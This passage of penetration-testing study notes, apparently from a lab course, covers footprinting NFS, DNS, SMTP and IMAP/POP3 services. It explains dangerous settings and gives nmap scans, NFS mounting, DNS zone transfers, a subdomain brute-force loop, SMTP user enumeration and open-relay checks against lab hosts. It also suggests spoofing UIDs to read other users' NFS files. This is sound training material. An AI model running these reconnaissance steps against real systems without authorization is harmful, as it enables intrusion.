Minimum password length is only 5 characters and complexity is not required — very weak password policy, making brute force attacks much easier.


---

## Section 7: NFS (Network File System)

### What is NFS?

NFS (Network File System) was developed by Sun Microsystems and serves a similar purpose to SMB — it allows remote file systems to be mounted and accessed as if they were local. The key difference is that NFS is designed for Linux and Unix systems, while SMB is for Windows. NFS clients cannot directly communicate with SMB servers and vice versa. NFS uses RPC (Remote Procedure Call) as its underlying communication mechanism and traditionally uses ports 111 (RPC portmapper) and 2049 (NFS service). Authentication in NFS versions 2 and 3 is based on UNIX UID/GID numbers — this means the server trusts whatever UID the client claims to have, which creates security risks if the server and client have different user mappings. NFSv4 adds Kerberos authentication and firewall-friendly operation using only port 2049.

---

### NFS Version Comparison

| Version | Notes |
|---|---|
| NFSv2 | The oldest version, supported by many legacy systems. Originally operated entirely over UDP. Very limited features. Rarely seen in modern environments. |
| NFSv3 | More commonly seen. Supports variable file sizes and better error reporting. Not fully compatible with NFSv2 clients. Still uses port 111 for portmapping plus dynamic ports for services. |
| NFSv4 | The modern standard. Includes Kerberos authentication, works through firewalls (uses only port 2049), supports ACLs, uses stateful operations, and provides performance improvements and high security. NFSv4.1 adds parallel NFS (pNFS) for distributed file access and session trunking (NFS multipathing) for redundant connections. |

---

### NFS Configuration — /etc/exports

#### Viewing the NFS Exports File

```bash
cat /etc/exports
```

**Purpose:** Reads the NFS exports configuration file. This file defines which local directories are shared (exported) over NFS and who can access them with what permissions. Each line defines one export: the directory path, the allowed hosts/networks, and the options in parentheses.

Example content:

```
# /etc/exports: the access control list for filesystems which may be exported
# Example for NFSv2 and NFSv3:
# /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
# Example for NFSv4:
# /srv/nfs4  gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
```

The comments show the format: directory, then hostname or subnet in parentheses with options.

#### Adding an NFS Share

```bash
echo ''/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)'' >> /etc/exports
systemctl restart nfs-kernel-server
exportfs
```

Purpose of each command:

- `echo ''/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)'' >> /etc/exports` — Adds a new export entry. This shares the `/mnt/nfs` directory to all hosts in the `10.129.14.0/24` subnet. The `sync` option means data is written to disk before the write is confirmed to the client (safer). The `no_subtree_check` disables checking whether files requested are within the exported subtree (improves reliability).
- `systemctl restart nfs-kernel-server` — Restarts the NFS server to apply the new exports configuration.
- `exportfs` — Displays the currently active NFS exports to confirm the new share is active.

Output of exportfs:
```
/mnt/nfs        10.129.14.0/24
```

#### NFS Export Options Explained

| Option | Description |
|---|---|
| `rw` | Read and Write permissions. Clients can read existing files AND create/modify/delete files. |
| `ro` | Read Only permissions. Clients can only read files — cannot make any changes. |
| `sync` | Synchronous data transfer. The server confirms writes only after data is physically written to disk. Slightly slower but safer — no data loss if the server crashes. |
| `async` | Asynchronous data transfer. The server confirms writes immediately without waiting for disk write. Faster but risks data loss if the server crashes before flushing to disk. |
| `secure` | Only allow connections from client ports below 1024. Ports below 1024 require root on the client, so this adds a small layer of security. |
| `insecure` | Allows connections from ANY client port including ports above 1024. Removes the port restriction. |
| `no_subtree_check` | Disables checking whether a requested file is actually within the exported directory tree. Improves reliability and performance. |
| `root_squash` | When the client connects as root (UID 0), the server maps that root access to the anonymous user (nobody). This prevents a root user on the client from having root access on the NFS server. This is ON by default in most configurations. |
| `no_root_squash` | The opposite of root_squash. Root on the client is treated as root on the server. This is DANGEROUS because anyone who gets root on the NFS client can modify any file on the NFS server including system files. |
| `nohide` | If another filesystem is mounted below an exported directory, normally it is hidden from NFS clients. With nohide, it becomes visible and is exported separately. |

---

### Dangerous NFS Settings

- **`rw + no_root_squash`** — Combined, these two settings are extremely dangerous. Any client with root access gets read/write access to the entire NFS share with root privileges on the server side. An attacker who gains root on any client machine can completely compromise the NFS server''s data.
- **`insecure`** — Allows connections from ports above 1024. Since only root can use ports below 1024, the `secure` option adds a small but meaningful barrier. Removing it with `insecure` means any process can make NFS connections.
- **`nohide`** — Can accidentally expose nested filesystems that administrators did not intend to share.

---

### Footprinting NFS with Nmap

#### Basic NFS Port Scan

```bash
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```

**Purpose:** Scans the two critical NFS ports. Port 111 is the RPC portmapper that tells clients which ports each RPC service is using. Port 2049 is the NFS service itself. The `-sV` detects versions, `-sC` runs default scripts including the rpcinfo script.

Example output:

```
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      44629/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
```

The rpcinfo output shows all currently running RPC services and their ports. `mountd` (port 45837) handles mount requests, `nlockmgr` handles file locking, and `nfs_acl` handles ACLs.

#### NFS-Specific NSE Scripts Scan

```bash
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

**Purpose:** The `nfs*` wildcard runs ALL Nmap scripts whose names start with "nfs". This includes `nfs-ls` (list directory contents), `nfs-showmount` (show exports), and `nfs-statfs` (disk statistics). Together these scripts give a comprehensive view of the NFS service without needing to mount anything.

Example output:

```
PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount:
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs:
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
```

> This is extremely valuable. Without even mounting the share, you can see there are SSH private key files (`id_rsa` and `id_rsa.pub`) owned by root (UID 0) sitting in the NFS share. The disk is 29% used with 20GB available.

---

### Performing NFS Tasks — Mounting and Accessing Shares

#### Step 1 — Show Available NFS Shares on Remote Server

```bash
showmount -e 10.129.14.128
```

**Purpose:** Queries the remote NFS server for its export list — showing which directories are shared and which clients/networks are allowed to mount them.

Example output:

```
Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

#### Step 2 — Create a Local Mount Point

```bash
mkdir target-NFS
```

**Purpose:** Creates an empty local directory called `target-NFS` that will serve as the mount point. The NFS share contents will appear inside this directory after mounting.

#### Step 3 — Mount the NFS Share

```bash
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
```

**Purpose:** Mounts the NFS share from the remote server onto your local directory.

Breaking down each part:

- `sudo` — Root privileges required to mount filesystems
- `mount` — The mount command
- `-t nfs` — Specifies the filesystem type is NFS
- `10.129.14.128:/` — The remote server IP and the path being mounted (root of the server''s NFS exports)
- `./target-NFS/` — The local directory to mount into
- `-o nolock` — Option to disable NFS file locking (prevents issues when the NFS server doesn''t support the lock manager)

#### Step 4 — Navigate and View Mounted Content

```bash
cd target-NFS
tree .
```

**Purpose:** Enters the mounted NFS directory and displays the file structure in tree format.

Example output:

```
.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

You now have local access to all these files as if they were on your own machine.

#### Step 5 — List Files with Usernames and Group Names

```bash
ls -l mnt/nfs/
```

**Purpose:** Lists files with their symbolic owner names (username and group name). This requires that the UID/GID numbers on the mounted files match existing users on YOUR local machine. If they do, you see real names.

Example output:

```
total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

Files owned by "cry0l1t3" and "root" are visible. If you create a local user with the same UID as cry0l1t3, you can read their private files.

#### Step 6 — List Files with UIDs and GIDs (Numeric)

```bash
ls -n mnt/nfs/
```

**Purpose:** The `-n` flag shows numeric UIDs and GIDs instead of resolving them to names. This is important for penetration testing because it shows you the exact numeric IDs, which you can use to create matching local users to gain access to the files.

Example output:

```
total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

Now you can see the exact UIDs. User "cry0l1t3" is UID 1000. The `id_rsa` files are owned by root (UID 0). The `backup.sh` is owned by root (UID 0) but in the cry0l1t3 group (GID 1000).

> **Important note:** If `root_squash` is enabled, even if you are root on your local machine, you cannot modify files owned by root on the NFS share because root_squash maps your root access to nobody.

#### Step 7 — Unmount the NFS Share

```bash
cd ..
sudo umount ./target-NFS
```

**Purpose:** First navigate OUT of the mounted directory (you cannot unmount a filesystem you are currently inside), then unmount it. `umount` removes the NFS mount and disconnects from the remote server. Always unmount when done to clean up properly and avoid leaving open connections.


---

## Section 8: DNS (Domain Name System)

### What is DNS?

DNS (Domain Name System) is the internet''s phonebook. It translates human-readable domain names like `hackthebox.com` into IP addresses like `10.10.10.1`. DNS does not use a central database — instead, information is distributed across thousands of name servers worldwide. There are different types of DNS servers: Root Servers (13 worldwide, manage top-level domains), Authoritative Nameservers (hold official records for a zone), Non-authoritative Nameservers (collect info via recursive queries), Caching Servers (store results temporarily), Forwarding Servers (forward queries to another server), and Resolvers (local to the computer or router). DNS is mostly unencrypted, making queries visible to ISPs and network devices. Modern solutions like DNS over TLS (DoT) and DNS over HTTPS (DoH) address this privacy concern.

---

### DNS Record Types

| Record | Description |
|---|---|
| `A` | Maps domain to IPv4 address |
| `AAAA` | Maps domain to IPv6 address |
| `MX` | Mail server records (which server handles email). Has a priority number — lower number means higher priority. |
| `NS` | Name server records (which DNS servers manage the domain) |
| `TXT` | Text records (verification codes, SPF, DMARC, DKIM) |
| `CNAME` | Alias record (one domain points to another) |
| `PTR` | Reverse lookup (IP address → domain name) |
| `SOA` | Start of Authority (admin contact, serial number, zone info) |

---

### DNS Configuration Files (BIND9)

BIND9 is the most common DNS server software on Linux. Its configuration is split across three files:

- `named.conf.local` — Defines zones (which domains this server is authoritative for)
- `named.conf.options` — Global server settings
- `named.conf.log` — Logging configuration

#### Zone File

```bash
cat /etc/bind/db.domain.com
```

The zone file maps hostnames to IP addresses. It contains SOA record, NS records, MX records, A records, and CNAME records. Every zone file must have exactly one SOA record and at least one NS record.

Example content:

```
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial number - increment on every change
                    21600      ; refresh - slaves check every 6 hours
                    3600       ; retry - if refresh fails, retry after 1 hour
                    604800     ; expire - slaves discard records after 1 week
                    86400 )    ; minimum TTL - 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.
      IN     MX     10     mx.domain.com.
      IN     MX     20     mx2.domain.com.
             IN     A       10.129.14.5

server1      IN     A       10.129.14.5
server2      IN     A       10.129.14.7
ns1          IN     A       10.129.14.2
ns2          IN     A       10.129.14.3

ftp          IN     CNAME   server1
mx           IN     CNAME   server1
mx2          IN     CNAME   server2
www          IN     CNAME   server2
```

#### Reverse Zone File

```bash
cat /etc/bind/db.10.129.14
```

The reverse zone file maps IP addresses back to hostnames using PTR records.

Example content:

```
$ORIGIN 14.129.10.in-addr.arpa
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh
                    3600       ; retry
                    604800     ; expire
                    86400 )    ; minimum TTL

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

5    IN     PTR    server1.domain.com.
7    IN     MX     mx.domain.com.
```

---

### Dangerous DNS Settings

| Setting | Risk |
|---|---|
| `allow-query { any; }` | Allows ANY host on the internet to send DNS queries. Combined with recursion, this can make the server an amplifier for DDoS attacks. |
| `allow-recursion { any; }` | Allows recursive queries from any host. A recursive query makes the DNS server do all the work of finding the answer. Enabling this from external hosts enables DNS amplification attacks. |
| `allow-transfer { any; }` | The most dangerous setting. Allows ANY host to request a full zone transfer (AXFR). This lets anyone download the complete list of ALL DNS records — revealing every hostname and IP address in the organization. |
| `zone-statistics` | Enables collection of query statistics. If accessible, reveals what domains are being queried and how often. |

---

### Footprinting DNS

#### DIG — NS Query (Find Name Servers)

```bash
dig ns inlanefreight.htb @10.129.14.128
```

**Purpose:** Queries the specified DNS server for the NS records of the domain `inlanefreight.htb`. This reveals which name servers are authoritative for the domain. The `@10.129.14.128` specifies which DNS server to ask.

Example output:

```
;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
```

The answer shows there is one name server: `ns.inlanefreight.htb` at IP `10.129.34.136`. The 604800 is the TTL (604800 seconds = 1 week). Now you know the IP of the authoritative DNS server.

#### DIG — Version Query (Identify DNS Software Version)

```bash
dig CH TXT version.bind 10.129.120.85
```

**Purpose:** Sends a special CHAOS class TXT query asking for the DNS server''s version information. Many DNS servers are configured to respond to this query with their software version. This is useful for finding known vulnerabilities in specific DNS software versions.

Breaking down:

- `CH` — The CHAOS class (a special DNS class separate from the normal IN/Internet class)
- `TXT` — Record type
- `version.bind` — Special query name that requests version information from BIND servers

Example output:

```
;; ANSWER SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1"

;; ADDITIONAL SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1-Debian"
```

The DNS server is running BIND version 9.10.6-P1 on Debian Linux. This specific version can be searched for known CVEs.

#### DIG — ANY Query (Retrieve All Record Types)

```bash
dig any inlanefreight.htb @10.129.14.128
```

**Purpose:** Requests ALL available record types for the domain in a single query. The server returns everything it is willing to disclose.

Example output:

```
;; ANSWER SECTION:
inlanefreight.htb. 604800 IN TXT "v=spf1 include:mailgun.org include:_spf.google.com..."
inlanefreight.htb. 604800 IN TXT "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1..."
inlanefreight.htb. 604800 IN TXT "MS=ms97310371"
inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800...
inlanefreight.htb. 604800 IN NS  ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
```

From this single query you can learn: the company uses Mailgun and Google for email, they use Atlassian tools, the SOA record shows `root@inlanefreight.htb` is the admin contact, and the only NS is at `10.129.34.136`.

#### DIG — AXFR Zone Transfer (External Zone)

```bash
dig axfr inlanefreight.htb @10.129.14.128
```

**Purpose:** Attempts a full zone transfer (AXFR - Asynchronous Full Transfer Zone) from the target DNS server. If the server is misconfigured to allow zone transfers from any IP, this downloads the COMPLETE zone file — every single DNS record for the domain.

Example output:

```
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800...
;; XFR size: 9 records (messages 1, bytes 520)
```

This reveals ALL hostnames and their IPs: an app server at 10.129.18.15, an internal server at 10.129.1.6, a mail server at 10.129.18.201. The zone transfer exposed the complete internal network map.

#### DIG — AXFR Zone Transfer (Internal Zone)

```bash
dig axfr internal.inlanefreight.htb @10.129.14.128
```

**Purpose:** Attempts zone transfer for the INTERNAL subdomain zone. Internal zones often contain even more sensitive information — domain controllers, VPN servers, internal workstations, and management systems.

Example output:

```
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb...
internal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
dc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A      10.129.34.136
vpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6
ws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34
ws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35
wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
;; XFR size: 15 records
```

This is a gold mine. Two domain controllers (dc1 at 10.129.34.16, dc2 at 10.129.34.11), a VPN server, two workstations (ws1, ws2), a WSUS (Windows Update) server, and internal mail. This is the complete internal network structure revealed by one DNS misconfiguration.

#### Subdomain Brute Force with Bash Loop

```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v '';\|SOA'' | sed -r ''/^\s*$/d'' | grep $sub | tee -a subdomains.txt; done
```

**Purpose:** Goes through every word in the subdomain wordlist, constructs a DNS query for each potential subdomain, and saves any that resolve to a file.

Breaking down:

- `cat /opt/useful/seclists/.../subdomains-top1million-110000.txt` — Reads a list of 110,000 common subdomain names
- `for sub in $(...)` — Loops through each subdomain name
- `dig $sub.inlanefreight.htb @10.129.14.128` — Queries for each potential subdomain
- `grep -v '';\|SOA''` — Removes comment lines and SOA records
- `sed -r ''/^\s*$/d''` — Removes empty lines
- `grep $sub` — Keeps only lines containing the subdomain name (meaning it resolved)
- `tee -a subdomains.txt` — Writes matching results to file AND displays them

Example output:

```
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
```

#### DNSenum — Automated DNS Enumeration

```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

**Purpose:** DNSenum automates the complete DNS enumeration process including NS queries, zone transfer attempts, and subdomain brute forcing.

Breaking down the flags:

- `--dnsserver 10.129.14.128` — Use this specific DNS server for all queries
- `--enum` — Enable full enumeration mode
- `-p 0` — No Google scraping (0 Google pages)
- `-s 0` — No Google scraping subdomains
- `-o subdomains.txt` — Save results to this file
- `-f /opt/.../subdomains-top1million-110000.txt` — Use this wordlist for brute forcing
- `inlanefreight.htb` — Target domain


---

## Section 9: SMTP (Simple Mail Transfer Protocol)

### What is SMTP?

SMTP is the protocol used to send emails across IP networks. It works between email clients and outgoing mail servers, and between mail servers themselves. By default, SMTP listens on **port 25**, but newer implementations also use **port 587** (for authenticated users with STARTTLS encryption). SMTP alone is text-based and unencrypted, but ESMTP (Extended SMTP) adds support for TLS encryption via the STARTTLS command.

The email flow works like this: The Mail User Agent (MUA, your email client) sends the email to a Mail Submission Agent (MSA), which validates it and passes it to the Mail Transfer Agent (MTA). The MTA looks up the recipient''s mail server in DNS (MX record) and delivers the email. At the destination, the Mail Delivery Agent (MDA) puts it in the recipient''s mailbox, accessible via IMAP or POP3.

SMTP has two main security weaknesses: no delivery confirmation system (you might not know if an email was delivered), and no built-in sender authentication (making email spoofing easy). Technologies like SPF, DKIM, and DMARC were developed to partially address these issues.

---

### Default SMTP Configuration

```bash
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

**Purpose:** Reads the Postfix mail server configuration (the most common SMTP server on Linux) filtering out comments and blank lines.

Example output:

```
smtpd_banner = ESMTP Server
biff = no
append_dot_mydomain = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
mydestination = $myhostname, localhost
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
```

Key settings: `myhostname` reveals the server''s hostname. `mynetworks` shows which networks can relay email (if set too broadly, open relay). `smtpd_banner` is what the server announces — "ESMTP Server" is generic which is good for security but less informative for us.

---

### SMTP Commands — Complete Reference

| Command | Description |
|---|---|
| `HELO / EHLO` | Start the session (EHLO for extended SMTP). Client introduces itself with its hostname. EHLO response lists all server capabilities. |
| `MAIL FROM:` | Specify the sender email address. Example: `MAIL FROM: <sender@example.com>` |
| `RCPT TO:` | Specify the recipient email address. Multiple `RCPT TO` commands can be used for multiple recipients. |
| `DATA` | Begin email body input. Type the email headers followed by a blank line then the message body. End with a single line containing only `.` |
| `VRFY` | Verify if a username exists on the server. Some servers respond differently for real vs fake usernames, enabling username enumeration. |
| `EXPN` | Expand a mailing list or verify a mailbox. Similar to VRFY but also expands mailing lists. |
| `RSET` | Reset current mail transaction without closing connection. Clears sender, recipient, and data but keeps session open. |
| `NOOP` | Keep connection alive (no operation). Sends a command that does nothing except keep the connection alive. |
| `QUIT` | Close the SMTP session. |
| `AUTH PLAIN` | Authenticate with username and password. Required by ESMTP to prevent spam relaying. |

---

### Performing SMTP Tasks

#### Connect to SMTP Server

```bash
telnet 10.129.14.128 25
```

After connecting, you see a `220` banner. Then you send `HELO` or `EHLO` to start the session.

#### HELO / EHLO Interaction

```
HELO mail1.inlanefreight.htb
→ 250 mail1.inlanefreight.htb (server acknowledges)

EHLO mail1
→ 250-PIPELINING
→ 250-SIZE 10240000
→ 250-VRFY
→ (lists all supported extensions)
```

EHLO reveals all capabilities the server supports.

#### User Enumeration with VRFY

```
VRFY root
→ 252 2.0.0 root

VRFY cry0l1t3
→ 252 2.0.0 cry0l1t3
```

The VRFY command asks if a username exists. Code `252` means the server won''t confirm or deny, but many servers respond differently for real vs. fake usernames. This can be used to enumerate valid usernames.

#### Sending an Email via Telnet — Complete Example

```
EHLO inlanefreight.htb
MAIL FROM: <cry0l1t3@inlanefreight.htb>
RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
DATA
From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: Test
Date: Tue, 28 Sept 2021 16:32:51 +0200

Message body here.
.
QUIT
```

Breaking down each step: `EHLO` starts extended session. `MAIL FROM` sets sender. `RCPT TO` sets recipient with `NOTIFY=success,failure` requesting delivery notifications. `DATA` begins body input. The headers (From, To, Subject, Date) are typed first, then blank line, then body. A single `.` on its own line ends the message.

---

### Dangerous SMTP Setting — Open Relay

An Open Relay is an SMTP server that allows anyone to send email through it without authentication. The dangerous configuration is:

```
mynetworks = 0.0.0.0/0
```

This means the server accepts email from all IP addresses. Attackers can abuse this to send spam or spoofed phishing emails that appear to come from the company''s own domain.

---

### Footprinting SMTP with Nmap

#### Basic SMTP Scan

```bash
sudo nmap 10.129.14.128 -sC -sV -p25
```

The default script `smtp-commands` runs EHLO and lists all supported commands.

Example output:

```
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY,
ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
```

The banner reveals it is Postfix and the hostname `mail1.inlanefreight.htb`. The VRFY capability confirms user enumeration may be possible.

#### Check for Open Relay

```bash
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

**Purpose:** Runs the `smtp-open-relay` NSE script which performs 16 different relay tests against the SMTP server to determine if it can be abused as an open relay.

Example output:

```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@ESMTP> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<relaytest@nmap.scanme.org>
```

All 16 tests passed — this server is a fully open relay. A critical finding in any penetration test.

---

## Section 10: IMAP / POP3

### What are IMAP and POP3?

Both IMAP and POP3 are protocols for **receiving** emails. **IMAP** (Internet Message Access Protocol) is the modern standard — it allows managing emails directly on the server with folder structures, works across multiple devices simultaneously, and keeps emails on the server until explicitly deleted. **POP3** (Post Office Protocol 3) is simpler — it only supports listing, retrieving, and deleting emails, and typically downloads emails to the local device and removes them from the server.

IMAP uses **port 143** (plain) and **993** (SSL/TLS). POP3 uses **port 110** (plain) and **995** (SSL/TLS). The higher ports (993, 995) use TLS for encrypted communication.

---

### IMAP Commands — Complete Reference

| Command | Description |
|---|---|
| `1 LOGIN username password` | Authenticate. The "1" is a tag (identifier) that labels this command — the server includes it in its response so you can match responses to commands. |
| `1 LIST "" *` | List all folders/directories. The first `""` is the reference name (empty means start from root) and `*` is a wildcard matching all names. |
| `1 CREATE "INBOX"` | Create a new mailbox. |
| `1 DELETE "INBOX"` | Delete a mailbox. |
| `1 RENAME "ToRead" "Important"` | Rename an existing mailbox folder. First argument is old name, second is new name. |
| `1 LSUB "" *` | Returns only folders the user has subscribed to. |
| `1 SELECT INBOX` | Select a mailbox to access its messages. After selecting, you can fetch, search, and manage messages. |
| `1 UNSELECT INBOX` | Exits the currently selected mailbox without closing the connection. |
| `1 FETCH <ID> all` | Retrieve all data (headers, body, flags) associated with a specific message. The ID is the message sequence number. |
| `1 CLOSE` | Removes all messages marked with the Deleted flag from the currently selected mailbox and then deselects it. |
| `1 LOGOUT` | Properly close the IMAP connection. |

---

### POP3 Commands — Complete Reference

| Command | Description |
|---|---|
| `USER username` | Identify the user. This is the first step of POP3 authentication. |
| `PASS password` | Provide the password for the user identified with USER. Together USER and PASS complete POP3 authentication. |
| `STAT` | Get number of emails and total size in bytes. Response format: `+OK <count> <total-bytes>` |
| `LIST` | List all emails with sizes. Can also take a message number to show only that message. |
| `RETR id` | Download a specific email by ID number. The complete email including all headers and body is sent. |
| `DELE id` | Mark a specific message for deletion. Messages are not actually deleted until the session ends with QUIT. |
| `CAPA` | Show server capabilities and supported extensions. |
| `RSET` | Resets the session — unmarks all messages marked for deletion. |
| `QUIT` | Close the connection. Any messages marked with DELE are permanently deleted at this point. |

---

### Dangerous IMAP/POP3 Settings

| Setting | Risk |
|---|---|
| `auth_debug` | Logs all authentication debug info (passwords might appear in logs) |
| `auth_debug_passwords` | Logs submitted passwords in plain text. A serious security risk. |
| `auth_verbose` | Logs failed authentication attempts (reveals valid usernames through different error messages) |
| `auth_verbose_passwords` | Logs submitted passwords (can be truncated). |
| `auth_anonymous_username` | Allows anonymous login via ANONYMOUS SASL mechanism. |

---

### Footprinting IMAP/POP3 with Nmap

```bash
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

**Purpose:** Scans all four mail protocol ports in one command. Port 110 for POP3 plain, 143 for IMAP plain, 993 for IMAP over SSL, 995 for POP3 over SSL. Default scripts reveal SSL certificates which contain organizational information.

Example output:

```
PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight
| stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58

143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS LOGIN-REFERRALS LITERAL+
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight

993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login AUTH=PLAINA0001 SASL-IR ENABLE IDLE IMAP4rev1

995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING
```

All four ports are running Dovecot. The SSL certificate reveals the hostname (`mail1.inlanefreight.htb`), organization (Inlanefreight), and location (California, US).

---

### Connect with cURL (IMAP over SSL)

```bash
curl -k ''imaps://10.129.14.128'' --user user:p4ssw0rd
```

**Purpose:** Uses cURL to connect to the IMAP server over SSL and authenticate. The `-k` flag ignores SSL certificate verification errors (useful for self-signed certs). If authentication succeeds, cURL lists the available mailbox folders.

Example output:

```
* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
```

Two mailbox folders exist: "Important" and "INBOX".

---

### Verbose cURL Connection (Full TLS Handshake)

```bash
curl -k ''imaps://10.129.14.128'' --user cry0l1t3:1234 -v
```

